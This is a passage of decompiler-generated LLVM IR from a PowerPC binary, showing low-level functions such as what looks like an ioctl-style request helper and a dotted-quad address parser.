  %v1_10007848 = load i32, i32* @r31, align 4
  %v2_10007848 = add i32 %v1_10007848, 8
  %v3_10007848 = inttoptr i32 %v2_10007848 to i32*
  store i32 %v0_10007848, i32* %v3_10007848, align 4
  %v0_1000784c = load i32, i32* %r10.global-to-local, align 4
  %v1_1000784c = load i32, i32* @r31, align 4
  %v2_1000784c = add i32 %v1_1000784c, 12
  %v3_1000784c = inttoptr i32 %v2_1000784c to i32*
  store i32 %v0_1000784c, i32* %v3_1000784c, align 4
  %v3_10007850 = load i32, i32* @r31, align 4
  %v4_10007850 = add i32 %v3_10007850, 16
  %v5_10007850 = inttoptr i32 %v4_10007850 to i8*
  store i8 %tmp4, i8* %v5_10007850, align 1
  %v1_10007854 = load i32, i32* @r31, align 4
  %v2_10007854 = add i32 %v1_10007854, 52
  %v3_10007854 = inttoptr i32 %v2_10007854 to i32*
  store i32 %tmp3, i32* %v3_10007854, align 4
  %v1_10007858 = load i32, i32* @r31, align 4
  %v2_10007858 = add i32 %v1_10007858, 56
  %v3_10007858 = inttoptr i32 %v2_10007858 to i32*
  store i32 %tmp2, i32* %v3_10007858, align 4
  store i32 268466272, i32* @lr, align 4
  %v6_1000785c = sext i8 %tmp4 to i32
  %v8_1000785c = call i32 @function_1000ab0c(i32 %v1_1000781c, i32 %v2_10007810, i32 19, i32 %tmp2, i32 %tmp3, i32 %v6_1000785c, i32 %tmp7)
  store i32 268466284, i32* @lr, align 4
  %v3_10007868 = call i32 @function_100071a4(i32 %v8_1000785c, i32 0, i32 13)
  %v0_10007870.pre = load i32, i32* @r30, align 4
  br label %dec_label_pc_1000786c

dec_label_pc_1000786c:                            ; preds = %dec_label_pc_100077e8, %dec_label_pc_10007824
  %v0_10007870 = phi i32 [ %v3_1000780c, %dec_label_pc_100077e8 ], [ %v0_10007870.pre, %dec_label_pc_10007824 ]
  store i32 %v0_100077ec, i32* %r0.global-to-local, align 4
  ret i32 %v0_10007870

; uselistorder directives
  uselistorder i32 %v2_100077fc, { 1, 0 }
  uselistorder i32 %tmp7, { 1, 0 }
  uselistorder i32 13, { 1, 0, 2, 3, 4 }
  uselistorder label %dec_label_pc_1000786c, { 1, 0 }
}

define i32 @function_10007884() local_unnamed_addr {
dec_label_pc_10007884:
  %r9.global-to-local = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %v0_10007884 = load i32, i32* @r4, align 4
  %v3_10007884 = icmp eq i32 %v0_10007884, 1
  %v0_10007894 = load i32, i32* @r3, align 4
  store i32 %v0_10007894, i32* @r27, align 4
  %v0_1000789c = load i32, i32* @r5, align 4
  store i32 %v0_1000789c, i32* @r31, align 4
  br i1 %v3_10007884, label %dec_label_pc_100078c0, label %dec_label_pc_100078a4

dec_label_pc_100078a4:                            ; preds = %dec_label_pc_10007884
  %v3_100078a4 = icmp eq i32 %v0_10007884, 2
  br i1 %v3_100078a4, label %dec_label_pc_100078e0, label %dec_label_pc_100078ac

dec_label_pc_100078ac:                            ; preds = %dec_label_pc_100078a4
  %v3_100078ac = icmp eq i32 %v0_10007884, 0
  store i32 -2144570348, i32* @r30, align 4
  br i1 %v3_100078ac, label %dec_label_pc_100078e8, label %dec_label_pc_100078cc

dec_label_pc_100078c0:                            ; preds = %dec_label_pc_10007884
  store i32 -2144570347, i32* @r30, align 4
  br label %dec_label_pc_100078e8

dec_label_pc_100078cc:                            ; preds = %dec_label_pc_100078ac
  %v0_100078cc = call i32 @function_10004e38()
  store i32 -1, i32* @r28, align 4
  %v2_100078d8 = inttoptr i32 %v0_100078cc to i32*
  store i32 22, i32* %v2_100078d8, align 4
  br label %dec_label_pc_100079d0

dec_label_pc_100078e0:                            ; preds = %dec_label_pc_100078a4
  store i32 -2144570346, i32* @r30, align 4
  br label %dec_label_pc_100078e8

dec_label_pc_100078e8:                            ; preds = %dec_label_pc_100078ac, %dec_label_pc_100078c0, %dec_label_pc_100078e0
  %v1_100078e8 = inttoptr i32 %v0_1000789c to i32*
  %v2_100078e8 = load i32, i32* %v1_100078e8, align 4
  store i32 19, i32* @r5, align 4
  %v1_100078f0 = add i32 %v0_1000789c, 4
  %v2_100078f0 = inttoptr i32 %v1_100078f0 to i32*
  %v3_100078f0 = load i32, i32* %v2_100078f0, align 4
  store i32 %v3_100078f0, i32* %r9.global-to-local, align 4
  %v1_100078f4 = add i32 %v0_1000789c, 17
  store i32 %v1_100078f4, i32* @r4, align 4
  %v1_100078f8 = add i32 %v0_1000789c, 8
  %v2_100078f8 = inttoptr i32 %v1_100078f8 to i32*
  %v3_100078f8 = load i32, i32* %v2_100078f8, align 4
  %v2_100078fc = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_100078fc, i32* @r3, align 4
  %v2_10007904 = ptrtoint i32* %stack_var_-72 to i32
  store i32 %v2_10007904, i32* @r26, align 4
  store i32 %v2_100078e8, i32* %stack_var_-72, align 4
  store i32 268466484, i32* @lr, align 4
  %v0_10007930 = call i32 @function_10007108()
  %v0_10007934 = load i32, i32* @r27, align 4
  %v0_10007938 = load i32, i32* @r30, align 4
  store i32 268466504, i32* @lr, align 4
  %v3_10007944 = call i32 @function_100049cc(i32 %v0_10007934, i32 %v0_10007938, i32 %v2_10007904)
  store i32 %v3_10007944, i32* @r28, align 4
  %v3_10007948 = icmp eq i32 %v3_10007944, 0
  br i1 %v3_10007948, label %dec_label_pc_10007950, label %dec_label_pc_100079d0

dec_label_pc_10007950:                            ; preds = %dec_label_pc_100078e8
  %v0_10007950 = load i32, i32* @r30, align 4
  %v3_10007954 = icmp eq i32 %v0_10007950, -2144570348
  br i1 %v3_10007954, label %dec_label_pc_1000795c, label %dec_label_pc_100079cc

dec_label_pc_1000795c:                            ; preds = %dec_label_pc_10007950
  %v0_1000795c = call i32 @function_10004e38()
  store i32 %v0_1000795c, i32* @r29, align 4
  %v0_1000796c = load i32, i32* @r27, align 4
  %v1_10007974 = inttoptr i32 %v0_1000795c to i32*
  %v2_10007974 = load i32, i32* %v1_10007974, align 4
  store i32 %v2_10007974, i32* @r30, align 4
  store i32 268466560, i32* @lr, align 4
  %v3_1000797c = call i32 @function_100049cc(i32 %v0_1000796c, i32 1076655123, i32 %v2_10007904)
  %v3_10007980 = icmp eq i32 %v3_1000797c, 0
  br i1 %v3_10007980, label %dec_label_pc_10007990, label %dec_label_pc_10007988

dec_label_pc_10007988:                            ; preds = %dec_label_pc_1000795c
  %v0_10007988 = load i32, i32* @r30, align 4
  %v1_10007988 = load i32, i32* @r29, align 4
  %v2_10007988 = inttoptr i32 %v1_10007988 to i32*
  store i32 %v0_10007988, i32* %v2_10007988, align 4
  br label %dec_label_pc_100079d0

dec_label_pc_10007990:                            ; preds = %dec_label_pc_1000795c
  %v0_10007990 = load i32, i32* @r31, align 4
  %v1_10007990 = add i32 %v0_10007990, 8
  %v2_10007990 = inttoptr i32 %v1_10007990 to i32*
  %v3_10007990 = load i32, i32* %v2_10007990, align 4
  %v1_10007998 = call i32 @__asm_rlwinm(i32 %v3_10007990, i32 0, i32 19, i32 20)
  %v1_1000799c = call i32 @__asm_rlwinm(i32 %v3_100078f8, i32 0, i32 19, i32 20)
  store i32 %v1_1000799c, i32* %r9.global-to-local, align 4
  %v4_100079a0 = icmp eq i32 %v1_10007998, %v1_1000799c
  br i1 %v4_100079a0, label %dec_label_pc_100079a8, label %dec_label_pc_100079bc

dec_label_pc_100079a8:                            ; preds = %dec_label_pc_10007990
  %v1_100079a8 = and i32 %v3_10007990, 768
  store i32 %v1_100079a8, i32* %r9.global-to-local, align 4
  %v3_100079a8 = icmp eq i32 %v1_100079a8, 0
  br i1 %v3_100079a8, label %dec_label_pc_100079cc, label %dec_label_pc_100079b0

dec_label_pc_100079b0:                            ; preds = %dec_label_pc_100079a8
  %v1_100079b0 = call i32 @__asm_rlwinm(i32 %v3_100078f8, i32 0, i32 22, i32 23)
  %v0_100079b4 = load i32, i32* %r9.global-to-local, align 4
  %v4_100079b4 = icmp eq i32 %v0_100079b4, %v1_100079b0
  br i1 %v4_100079b4, label %dec_label_pc_100079cc, label %dec_label_pc_100079bc

dec_label_pc_100079bc:                            ; preds = %dec_label_pc_10007990, %dec_label_pc_100079b0
  store i32 -1, i32* @r28, align 4
  %v1_100079c4 = load i32, i32* @r29, align 4
  %v2_100079c4 = inttoptr i32 %v1_100079c4 to i32*
  store i32 22, i32* %v2_100079c4, align 4
  br label %dec_label_pc_100079d0

dec_label_pc_100079cc:                            ; preds = %dec_label_pc_10007950, %dec_label_pc_100079b0, %dec_label_pc_100079a8
  store i32 0, i32* @r28, align 4
  br label %dec_label_pc_100079d0

dec_label_pc_100079d0:                            ; preds = %dec_label_pc_100078e8, %dec_label_pc_10007988, %dec_label_pc_100078cc, %dec_label_pc_100079bc, %dec_label_pc_100079cc
  %v0_100079d4 = load i32, i32* @r28, align 4
  ret i32 %v0_100079d4

; uselistorder directives
  uselistorder i32 %v0_1000789c, { 1, 0, 3, 2, 4 }
  uselistorder i32* %r9.global-to-local, { 2, 3, 0, 1 }
  uselistorder i32 (i32, i32, i32)* @function_100049cc, { 2, 1, 0, 3 }
  uselistorder i32 19, { 3, 4, 5, 0, 6, 1, 2 }
  uselistorder label %dec_label_pc_100079d0, { 4, 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_100079cc, { 1, 2, 0 }
  uselistorder label %dec_label_pc_100079bc, { 1, 0 }
  uselistorder label %dec_label_pc_100078e8, { 2, 1, 0 }
}

define i32 @function_100079e8(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_100079e8:
  %v0_100079e8 = load i32, i32* @r3, align 4
  ret i32 %v0_100079e8
}

define i32 @function_100079f4(i32 %arg1) local_unnamed_addr {
dec_label_pc_100079f4:
  %v0_100079f4 = load i32, i32* @r3, align 4
  ret i32 %v0_100079f4
}

define i32 @function_100079f8(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_100079f8:
  %cr0_eq.global-to-local = alloca i1, align 1
  %cr1_eq.global-to-local = alloca i1, align 1
  %cr6_eq.global-to-local = alloca i1, align 1
  %cr7_eq.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  store i32 0, i32* %r5.global-to-local, align 4
  store i32 0, i32* %r6.global-to-local, align 4
  %v0_10007a0c.pre = load i32, i32* @r3, align 4
  br label %dec_label_pc_10007a0c

dec_label_pc_10007a0c:                            ; preds = %dec_label_pc_10007afc, %dec_label_pc_100079f8
  %v0_10007a20 = phi i32 [ %v1_10007afc, %dec_label_pc_10007afc ], [ %v0_10007a0c.pre, %dec_label_pc_100079f8 ]
  %v1_10007a0c = inttoptr i32 %v0_10007a20 to i8*
  %v2_10007a0c = load i8, i8* %v1_10007a0c, align 1
  %v3_10007a0c = zext i8 %v2_10007a0c to i32
  store i32 %v3_10007a0c, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r7.global-to-local, align 4
  store i32 10, i32* %r8.global-to-local, align 4
  %v3_10007a18 = icmp eq i8 %v2_10007a0c, 48
  store i1 %v3_10007a18, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10007a18, label %dec_label_pc_10007a20, label %dec_label_pc_10007a48

dec_label_pc_10007a20:                            ; preds = %dec_label_pc_10007a0c
  %v1_10007a20 = add i32 %v0_10007a20, 1
  %v2_10007a20 = inttoptr i32 %v1_10007a20 to i8*
  %v3_10007a20 = load i8, i8* %v2_10007a20, align 1
  %v4_10007a20 = zext i8 %v3_10007a20 to i32
  store i32 %v4_10007a20, i32* %r0.global-to-local, align 4
  store i32 %v1_10007a20, i32* @r3, align 4
  %v3_10007a24 = icmp eq i8 %v3_10007a20, 120
  store i1 %v3_10007a24, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10007a24, label %dec_label_pc_10007a3c, label %dec_label_pc_10007a2c

dec_label_pc_10007a2c:                            ; preds = %dec_label_pc_10007a20
  %v3_10007a2c = icmp eq i8 %v3_10007a20, 88
  store i1 %v3_10007a2c, i1* %cr7_eq.global-to-local, align 1
  store i32 1, i32* %r7.global-to-local, align 4
  store i32 8, i32* %r8.global-to-local, align 4
  br i1 %v3_10007a2c, label %dec_label_pc_10007a3c, label %dec_label_pc_10007a48

dec_label_pc_10007a3c:                            ; preds = %dec_label_pc_10007a2c, %dec_label_pc_10007a20
  %v1_10007a3c = add i32 %v0_10007a20, 2
  store i32 %v1_10007a3c, i32* @r3, align 4
  store i32 0, i32* %r7.global-to-local, align 4
  store i32 16, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_10007a48

dec_label_pc_10007a48:                            ; preds = %dec_label_pc_10007a2c, %dec_label_pc_10007a0c, %dec_label_pc_10007a3c
  %v0_10007ac05 = phi i32 [ %v1_10007a20, %dec_label_pc_10007a2c ], [ %v0_10007a20, %dec_label_pc_10007a0c ], [ %v1_10007a3c, %dec_label_pc_10007a3c ]
  %v0_10007a48 = phi i32 [ 8, %dec_label_pc_10007a2c ], [ 10, %dec_label_pc_10007a0c ], [ 16, %dec_label_pc_10007a3c ]
  %v3_10007a48 = icmp eq i32 %v0_10007a48, 8
  store i1 %v3_10007a48, i1* %cr1_eq.global-to-local, align 1
  %v3_10007a4c = icmp eq i32 %v0_10007a48, 16
  store i1 %v3_10007a4c, i1* %cr6_eq.global-to-local, align 1
  %v3_10007a50 = load i32, i32* @global_var_1001044c, align 4
  store i32 %v3_10007a50, i32* %r4.global-to-local, align 4
  store i32 0, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_10007ac0

dec_label_pc_10007a5c:                            ; preds = %dec_label_pc_10007ac0
  %v1_10007ac8 = mul nuw nsw i32 %v3_10007ac0, 2
  %v1_10007a5c = load i32, i32* %r4.global-to-local, align 4
  %v2_10007a5c = add i32 %v1_10007a5c, %v1_10007ac8
  %v3_10007a5c = inttoptr i32 %v2_10007a5c to i16*
  %v4_10007a5c = load i16, i16* %v3_10007a5c, align 2
  %v5_10007a5c = zext i16 %v4_10007a5c to i32
  %v1_10007a60 = mul i32 %v0_10007a60, 16
  store i32 %v1_10007a60, i32* %r10.global-to-local, align 4
  %v1_10007a64 = and i32 %v5_10007a5c, 8
  %v3_10007a64 = icmp eq i32 %v1_10007a64, 0
  store i1 %v3_10007a64, i1* %cr0_eq.global-to-local, align 1
  %v1_10007a68 = call i32 @__asm_rlwinm(i32 %v5_10007a5c, i32 28, i32 31, i32 31)
  %v1_10007a6c = call i32 @__asm_rlwinm(i32 %v5_10007a5c, i32 31, i32 31, i32 31)
  %v3_10007a70 = icmp eq i32 %v1_10007a68, 0
  store i1 %v3_10007a70, i1* %cr7_eq.global-to-local, align 1
  %not.v2_10007a74 = icmp eq i32 %v1_10007a6c, 0
  %v6_10007a78 = sext i1 %not.v2_10007a74 to i32
  %v1_10007a7c = call i32 @__asm_rlwinm(i32 %v6_10007a78, i32 0, i32 26, i32 26)
  %v1_10007a80 = add i32 %v1_10007a7c, -87
  %v0_10007a84 = load i1, i1* %cr0_eq.global-to-local, align 1
  br i1 %v0_10007a84, label %dec_label_pc_10007aa4, label %dec_label_pc_10007a88

dec_label_pc_10007a88:                            ; preds = %dec_label_pc_10007a5c
  %v0_10007a88 = load i32, i32* %r0.global-to-local, align 4
  %v2_10007a88 = icmp ugt i32 %v0_10007a88, 55
  %v3_10007a88 = icmp eq i32 %v0_10007a88, 55
  store i1 %v3_10007a88, i1* %cr7_eq.global-to-local, align 1
  %v0_10007a8c = load i1, i1* %cr1_eq.global-to-local, align 1
  %brmerge.demorgan = and i1 %v2_10007a88, %v0_10007a8c
  br i1 %brmerge.demorgan, label %dec_label_pc_10007b0c, label %dec_label_pc_10007a94

dec_label_pc_10007a94:                            ; preds = %dec_label_pc_10007a88
  %v0_10007a94 = load i32, i32* %r11.global-to-local, align 4
  %v1_10007a94 = load i32, i32* %r8.global-to-local, align 4
  %v2_10007a94 = mul i32 %v1_10007a94, %v0_10007a94
  %v2_10007a98 = add i32 %v2_10007a94, %v0_10007a88
  %v1_10007a9c = add i32 %v2_10007a98, -48
  br label %dec_label_pc_10007ab0

dec_label_pc_10007aa4:                            ; preds = %dec_label_pc_10007a5c
  %v0_10007aa4 = load i1, i1* %cr6_eq.global-to-local, align 1
  br i1 %v0_10007aa4, label %dec_label_pc_10007aa8, label %dec_label_pc_10007ad0

dec_label_pc_10007aa8:                            ; preds = %dec_label_pc_10007aa4
  %v0_10007aa8 = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_10007aa8, label %dec_label_pc_10007ad0, label %dec_label_pc_10007aac

dec_label_pc_10007aac:                            ; preds = %dec_label_pc_10007aa8
  %v0_10007aac = load i32, i32* %r10.global-to-local, align 4
  %v2_10007aac = add i32 %v0_10007aac, %v1_10007a80
  br label %dec_label_pc_10007ab0

dec_label_pc_10007ab0:                            ; preds = %dec_label_pc_10007a94, %dec_label_pc_10007aac
  %storemerge = phi i32 [ %v1_10007a9c, %dec_label_pc_10007a94 ], [ %v2_10007aac, %dec_label_pc_10007aac ]
  store i32 %storemerge, i32* %r11.global-to-local, align 4
  %v2_10007ab0 = icmp ugt i32 %storemerge, 255
  %v3_10007ab0 = icmp eq i32 %storemerge, 255
  store i1 %v3_10007ab0, i1* %cr7_eq.global-to-local, align 1
  %v0_10007ab4 = load i32, i32* @r3, align 4
  %v1_10007ab4 = add i32 %v0_10007ab4, 1
  store i32 %v1_10007ab4, i32* @r3, align 4
  store i32 1, i32* %r7.global-to-local, align 4
  br i1 %v2_10007ab0, label %dec_label_pc_10007b0c, label %dec_label_pc_10007ac0

dec_label_pc_10007ac0:                            ; preds = %dec_label_pc_10007ab0, %dec_label_pc_10007a48
  %v0_10007a60 = phi i32 [ %storemerge, %dec_label_pc_10007ab0 ], [ 0, %dec_label_pc_10007a48 ]
  %v0_10007ac0 = phi i32 [ %v1_10007ab4, %dec_label_pc_10007ab0 ], [ %v0_10007ac05, %dec_label_pc_10007a48 ]
  %v1_10007ac0 = inttoptr i32 %v0_10007ac0 to i8*
  %v2_10007ac0 = load i8, i8* %v1_10007ac0, align 1
  %v3_10007ac0 = zext i8 %v2_10007ac0 to i32
  store i32 %v3_10007ac0, i32* %r0.global-to-local, align 4
  %v3_10007ac4 = icmp eq i8 %v2_10007ac0, 0
  store i1 %v3_10007ac4, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10007ac4, label %dec_label_pc_10007ad0, label %dec_label_pc_10007a5c

dec_label_pc_10007ad0:                            ; preds = %dec_label_pc_10007aa4, %dec_label_pc_10007ac0, %dec_label_pc_10007aa8
  %v0_10007ad0 = load i32, i32* %r7.global-to-local, align 4
  %v3_10007ad0 = icmp eq i32 %v0_10007ad0, 0
  store i1 %v3_10007ad0, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10007ad0, label %dec_label_pc_10007b0c, label %dec_label_pc_10007ad8

dec_label_pc_10007ad8:                            ; preds = %dec_label_pc_10007ad0
  %v0_10007ad8 = load i32, i32* %r5.global-to-local, align 4
  %v3_10007ad8 = icmp eq i32 %v0_10007ad8, 0
  store i1 %v3_10007ad8, i1* %cr7_eq.global-to-local, align 1
  %v0_10007ae8.pre = load i32, i32* %r6.global-to-local, align 4
  br i1 %v3_10007ad8, label %dec_label_pc_10007ae4, label %dec_label_pc_10007ae0

dec_label_pc_10007ae0:                            ; preds = %dec_label_pc_10007ad8
  %v1_10007ae0 = mul i32 %v0_10007ae8.pre, 256
  store i32 %v1_10007ae0, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_10007ae4

dec_label_pc_10007ae4:                            ; preds = %dec_label_pc_10007ad8, %dec_label_pc_10007ae0
  %v0_10007ae8 = phi i32 [ %v1_10007ae0, %dec_label_pc_10007ae0 ], [ %v0_10007ae8.pre, %dec_label_pc_10007ad8 ]
  %v0_10007ae4 = load i32, i32* %r0.global-to-local, align 4
  %v3_10007ae4 = icmp eq i32 %v0_10007ae4, 46
  store i1 %v3_10007ae4, i1* %cr7_eq.global-to-local, align 1
  %v1_10007ae8 = load i32, i32* %r11.global-to-local, align 4
  %v2_10007ae8 = or i32 %v1_10007ae8, %v0_10007ae8
  store i32 %v2_10007ae8, i32* %r6.global-to-local, align 4
  br i1 %v3_10007ae4, label %dec_label_pc_10007af0, label %dec_label_pc_10007b04

dec_label_pc_10007af0:                            ; preds = %dec_label_pc_10007ae4
  %v3_10007af0 = icmp eq i32 %v0_10007ad8, 3
  store i1 %v3_10007af0, i1* %cr7_eq.global-to-local, align 1
  %v1_10007af4 = add i32 %v0_10007ad8, 1
  store i32 %v1_10007af4, i32* %r5.global-to-local, align 4
  br i1 %v3_10007af0, label %dec_label_pc_10007b0c, label %dec_label_pc_10007afc

dec_label_pc_10007afc:                            ; preds = %dec_label_pc_10007af0
  %v0_10007afc = load i32, i32* @r3, align 4
  %v1_10007afc = add i32 %v0_10007afc, 1
  store i32 %v1_10007afc, i32* @r3, align 4
  br label %dec_label_pc_10007a0c

dec_label_pc_10007b04:                            ; preds = %dec_label_pc_10007ae4
  %v3_10007b04 = icmp eq i32 %v0_10007ae4, 0
  store i1 %v3_10007b04, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10007b04, label %dec_label_pc_10007b10, label %dec_label_pc_10007b0c

dec_label_pc_10007b0c:                            ; preds = %dec_label_pc_10007af0, %dec_label_pc_10007ad0, %dec_label_pc_10007a88, %dec_label_pc_10007ab0, %dec_label_pc_10007b04
  store i32 -1, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_10007b10

dec_label_pc_10007b10:                            ; preds = %dec_label_pc_10007b04, %dec_label_pc_10007b0c
  %v0_10007b10 = phi i32 [ %v2_10007ae8, %dec_label_pc_10007b04 ], [ -1, %dec_label_pc_10007b0c ]
  ret i32 %v0_10007b10

; uselistorder directives
  uselistorder i32 %v1_10007afc, { 1, 0 }
  uselistorder i32 %v1_10007ae0, { 1, 0 }
  uselistorder i32 %v0_10007ae8.pre, { 1, 0 }
  uselistorder i32 %v3_10007ac0, { 1, 0 }
  uselistorder i32 %storemerge, { 0, 2, 1, 3 }
  uselistorder i32 %v5_10007a5c, { 1, 0, 2 }
  uselistorder i32 %v0_10007a48, { 1, 0 }
  uselistorder i1 %v3_10007a2c, { 1, 0 }
  uselistorder i32 %v0_10007a20, { 1, 0, 2, 3 }
  uselistorder i32* %r8.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32* %r7.global-to-local, { 3, 0, 1, 2, 4 }
  uselistorder i32* %r11.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32* %r0.global-to-local, { 0, 2, 1, 3, 4 }
  uselistorder i1* %cr7_eq.global-to-local, { 0, 1, 2, 3, 4, 9, 5, 7, 6, 8, 10, 11, 12 }
  uselistorder label %dec_label_pc_10007b10, { 1, 0 }
  uselistorder label %dec_label_pc_10007b0c, { 4, 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_10007ae4, { 1, 0 }
  uselistorder label %dec_label_pc_10007ad0, { 1, 2, 0 }
  uselistorder label %dec_label_pc_10007ab0, { 1, 0 }
  uselistorder label %dec_label_pc_10007a48, { 2, 0, 1 }
}

define i32 @function_10007b20(i32 %arg1) local_unnamed_addr {
dec_label_pc_10007b20:
  %stack_var_-24 = alloca i32, align 4
  %v2_10007b28 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_10007b28, i32* @r4, align 4
  store i32 268466996, i32* @lr, align 4
  %v1_10007b30 = bitcast i32* %stack_var_-24 to i8*
  %v2_10007b30 = call i32 @function_1000ad10(i8* %v1_10007b30)
  %v3_10007b34 = icmp eq i32 %v2_10007b30, 0
  br i1 %v3_10007b34, label %dec_label_pc_10007b44, label %dec_label_pc_10007b40

dec_label_pc_10007b40:                            ; preds = %dec_label_pc_10007b20
  %v3_10007b40 = load i32, i32* %stack_var_-24, align 4
  br label %dec_label_pc_10007b44

dec_label_pc_10007b44:                            ; preds = %dec_label_pc_10007b20, %dec_label_pc_10007b40
  %v0_10007b50 = phi i32 [ -1, %dec_label_pc_10007b20 ], [ %v3_10007b40, %dec_label_pc_10007b40 ]
  ret i32 %v0_10007b50

; uselistorder directives
  uselistorder i32* %stack_var_-24, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10007b44, { 1, 0 }
}

define i32 @function_10007b54(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_10007b54:
  %stack_var_-40 = alloca i32, align 4
  %v0_10007b68 = call i32 @function_10009ac4()
  %v2_10007b78 = ptrtoint i32* %stack_var_-40 to i32
  store i32 268467088, i32* @lr, align 4
  %v7_10007b8c = call i32 @function_10007ba8(i32 %arg1, i32* nonnull @global_var_10012ae0.259, i32 ptrtoint (i32* @global_var_10012914.260 to i32), i32 460, i32 %v2_10007b78, i32 %v0_10007b68)
  %v3_10007b94 = load i32, i32* %stack_var_-40, align 4
  ret i32 %v3_10007b94
}

define i32 @function_10007ba8(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
dec_label_pc_10007ba8:
  %ctr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r20.global-to-local = alloca i32, align 4
  %r21.global-to-local = alloca i32, align 4
  %r22.global-to-local = alloca i32, align 4
  %r25.global-to-local = alloca i32, align 4
  %r26.global-to-local = alloca i32, align 4
  %r28.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %tmp18 = call i32 @__decompiler_undefined_function_0()
  %tmp19 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-100 = alloca i32, align 4
  %stack_var_-120 = alloca i32, align 4
  %stack_var_-116 = alloca i32, align 4
  %v0_10007bac = load i32, i32* @lr, align 4
  store i32 %v0_10007bac, i32* %r0.global-to-local, align 4
  store i32 %arg1, i32* @r23, align 4
  %v3_10007bb4 = icmp eq i32 %arg1, 0
  store i32 0, i32* @r31, align 4
  store i32 %arg5, i32* %r20.global-to-local, align 4
  store i32 %tmp, i32* %r26.global-to-local, align 4
  store i32 %arg3, i32* %r30.global-to-local, align 4
  store i32 %arg4, i32* %r29.global-to-local, align 4
  store i32 %arg6, i32* @r24, align 4
  %v2_10007bd4 = inttoptr i32 %arg5 to i32*
  store i32 0, i32* %v2_10007bd4, align 4
  store i32 22, i32* %r3.global-to-local, align 4
  br i1 %v3_10007bb4, label %dec_label_pc_10007ed8, label %dec_label_pc_10007be0

dec_label_pc_10007be0:                            ; preds = %dec_label_pc_10007ba8
  %v0_10007be0 = call i32 @function_10004e38()
  store i32 %v0_10007be0, i32* %r3.global-to-local, align 4
  %v1_10007be8 = inttoptr i32 %v0_10007be0 to i32*
  %v2_10007be8 = load i32, i32* %v1_10007be8, align 4
  store i32 %v2_10007be8, i32* @r27, align 4
  store i32 %v0_10007be0, i32* %r28.global-to-local, align 4
  %v0_10007bf0 = load i32, i32* @r31, align 4
  store i32 %v0_10007bf0, i32* %v1_10007be8, align 4
  %v0_10007bf4 = load i32, i32* %r26.global-to-local, align 4
  %v0_10007bf8 = load i32, i32* @r23, align 4
  store i32 %v0_10007bf8, i32* %r3.global-to-local, align 4
  %v0_10007bfc = load i32, i32* %r30.global-to-local, align 4
  %v0_10007c00 = load i32, i32* %r29.global-to-local, align 4
  %v0_10007c04 = load i32, i32* %r20.global-to-local, align 4
  %v0_10007c08 = load i32, i32* @r24, align 4
  store i32 268467216, i32* @lr, align 4
  %v7_10007c0c = call i32 @function_1000b740(i32 %v0_10007bf8, i32 2, i32 %v0_10007bf4, i32 %v0_10007bfc, i32 %v0_10007c00, i32 %v0_10007c04, i32 %v0_10007c08)
  store i32 %v7_10007c0c, i32* %r3.global-to-local, align 4
  %v3_10007c10 = icmp eq i32 %v7_10007c0c, 0
  br i1 %v3_10007c10, label %dec_label_pc_10007ed8, label %dec_label_pc_10007c18

dec_label_pc_10007c18:                            ; preds = %dec_label_pc_10007be0
  %v0_10007c18 = load i32, i32* @r24, align 4
  %v1_10007c18 = inttoptr i32 %v0_10007c18 to i32*
  %v2_10007c18 = load i32, i32* %v1_10007c18, align 4
  store i32 %v2_10007c18, i32* %r0.global-to-local, align 4
  %v3_10007c1c = icmp eq i32 %v2_10007c18, 1
  br i1 %v3_10007c1c, label %dec_label_pc_10007c40, label %dec_label_pc_10007c24

dec_label_pc_10007c24:                            ; preds = %dec_label_pc_10007c18
  %v3_10007c24 = icmp eq i32 %v2_10007c18, 4
  br i1 %v3_10007c24, label %dec_label_pc_10007c40, label %dec_label_pc_10007c2c

dec_label_pc_10007c2c:                            ; preds = %dec_label_pc_10007c24
  %v3_10007c2c = icmp eq i32 %v2_10007c18, -1
  br i1 %v3_10007c2c, label %dec_label_pc_10007c34, label %dec_label_pc_10007ed8

dec_label_pc_10007c34:                            ; preds = %dec_label_pc_10007c2c
  %v0_10007c34 = load i32, i32* @r28, align 4
  %v1_10007c34 = inttoptr i32 %v0_10007c34 to i32*
  %v2_10007c34 = load i32, i32* %v1_10007c34, align 4
  store i32 %v2_10007c34, i32* %r0.global-to-local, align 4
  %v3_10007c38 = icmp eq i32 %v2_10007c34, 2
  br i1 %v3_10007c38, label %dec_label_pc_10007c40, label %dec_label_pc_10007ed8

